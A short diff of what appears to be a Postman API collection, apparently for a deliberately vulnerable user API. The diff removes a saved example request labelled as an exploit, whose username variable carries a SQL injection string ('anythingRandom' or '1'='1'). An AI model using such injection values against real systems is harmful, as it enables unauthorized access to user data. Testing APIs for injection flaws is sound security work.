@@ -122,42 +122,7 @@
 				},
 				"description": "Displays user by username"
 			},
-			"response": [
-				{
-					"name": "Retrieves user by username (exploit)",
-					"originalRequest": {
-						"method": "GET",
-						"header": [
-							{
-								"key": "Accept",
-								"value": "application/json"
-							}
-						],
-						"url": {
-							"raw": "{{baseUrl}}/users/v1/:username",
-							"host": [
-								"{{baseUrl}}"
-							],
-							"path": [
-								"users",
-								"v1",
-								":username"
-							],
-							"variable": [
-								{
-									"key": "username",
-									"value": "anythingRandom' or '1'='1",
-									"description": "(Required) retrieve username data"
-								}
-							]
-						}
-					},
-					"_postman_previewlanguage": "Text",
-					"header": [],
-					"cookie": [],
-					"body": ""
-				}
-			]
+			"response": []
 		},
 		{
 			"name": "Retrieves all users",
